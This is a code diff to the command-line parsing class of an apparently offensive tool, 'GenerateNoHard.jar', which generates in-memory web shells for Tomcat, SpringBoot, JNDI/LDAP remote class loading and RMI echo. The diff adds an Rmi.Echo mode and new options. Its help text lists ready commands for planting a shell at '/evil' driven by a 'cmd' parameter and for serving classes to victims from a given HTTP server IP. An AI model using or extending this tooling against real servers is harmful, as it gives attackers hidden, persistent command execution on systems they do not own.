@@ -29,12 +29,13 @@ public class Usage {
         modes.add("Tomcat.89.Filter");
 //        modes.add("Tomcat.10.Filter");
         modes.add("Jndi.Ldap.URLClassLoader");
+        modes.add("Rmi.Echo");
 
 
         encodes.add("classFile");
         encodes.add("base64");
         encodes.add("hex");
-        encodes.add("byte");
+        encodes.add("bytes");
 
         for (String mode : modes) {
             modeList.append(mode + ", ");
@@ -43,6 +44,7 @@ public class Usage {
             encodeList.append(encode + ", ");
         }
 
+        options.addOption("help", false, "help infomation");
         options.addOption("url", true, "memory shell url");
         options.addOption("commandArg", true, "command variable name");
         options.addOption("mode", true, "memory shell mode: [" + modeList.toString() + "]");
@@ -50,12 +52,11 @@ public class Usage {
         options.addOption("headerPassword", true, "shell connect password via http header");
         options.addOption("filePath", true, "additional argument. specify class file path");
 //        options.addOption("libPath", true, "jar lib path");
-        options.addOption("jndiServerIp", true, "jndiServerIp");
         options.addOption("jndiServerPort", true, "jndiServerPort");
         options.addOption("httpServerIp", true, "httpServerIp");
         options.addOption("httpServerPort", true, "httpServerPort");
         options.addOption("webPath", true, "webPath");
-        options.addOption("help", false, "help infomation");
+        options.addOption("rmiExObjPort", true, "Rmi echo export object bind port");
     }
 
     public static boolean hasModes(String mode) {
@@ -88,8 +89,9 @@ public class Usage {
             if (!modeExsis)
                 return false;
 
-            Usage.args.put("url", parse.getOptionValue("url"));
-            Usage.args.put("commandArg", parse.getOptionValue("commandArg"));
+            if("Rmi.Echo".equals(parse.getOptionValue("mode"))){
+                Usage.args.put("rmiExObjPort", parse.getOptionValue("rmiExObjPort"));
+            }
 
             //check encode
             if ("classFile".equals(parse.getOptionValue("encode")))
@@ -100,7 +102,6 @@ public class Usage {
                     return false;
                 }
 
-            Usage.args.put("encode", parse.getOptionValue("encode"));
 
             if (parse.hasOption("headerPassword")) {
                 String headerPassword = parse.getOptionValue("headerPassword");
@@ -113,17 +114,20 @@ public class Usage {
             }
 
             if (parse.getOptionValue("mode").contains("Jndi")){
-                Usage.args.put("jndiServerIp", parse.getOptionValue("jndiServerIp"));
-                Usage.args.put("jndiServerPort", parse.getOptionValue("jndiServerPort"));
+                Usage.args.put("rmiExObjPort", parse.getOptionValue("rmiExObjPort"));
                 Usage.args.put("httpServerIp", parse.getOptionValue("httpServerIp"));
+                Usage.args.put("jndiServerPort", parse.getOptionValue("jndiServerPort"));
                 Usage.args.put("httpServerPort", parse.getOptionValue("httpServerPort"));
                 Usage.args.put("webPath", parse.getOptionValue("webPath"));
                 Usage.args.put("className", parse.getOptionValue("className"));
             }
 
-
-            //parse mode
             Usage.args.put("mode", parse.getOptionValue("mode"));
+            Usage.args.put("encode", parse.getOptionValue("encode"));
+            Usage.args.put("url", parse.getOptionValue("url"));
+            Usage.args.put("commandArg", parse.getOptionValue("commandArg"));
+            Usage.args.put("filePath", parse.getOptionValue("filePath"));
+
         } catch (ParseException e) {
             e.printStackTrace();
         }
@@ -136,6 +140,8 @@ public class Usage {
                 .concat("java -jar GenerateNoHard.jar -mode SpringBoot.registerHandler -encode base64 -url /evil -commandArg cmd\n")
                 .concat("java -jar GenerateNoHard.jar -mode Jndi.Ldap.URLClassLoader -webPath /web -commandArg cmd\n")
                 .concat("java -jar GenerateNoHard.jar -mode SpringBoot.registerHandler -encode classFile -filePath /class -url /evil -commandArg cmd -headerPassword evil=attack\n")
+                .concat("java -jar GenerateNoHard.jar -mode Rmi.Echo -encode base64 -rmiExObjPort 7766\n")
+                .concat("java -jar GenerateNoHard.jar -mode Jndi.Ldap.URLClassLoader -httpServerIp 192.168.122.1 -jndiServerPort 7766 -rmiExObjPort 3344 -webPath /opt/tmp\n")
                 .concat("args:\n");
         HelpFormatter helpFormatter = new HelpFormatter();
         helpFormatter.printHelp(usage, options);
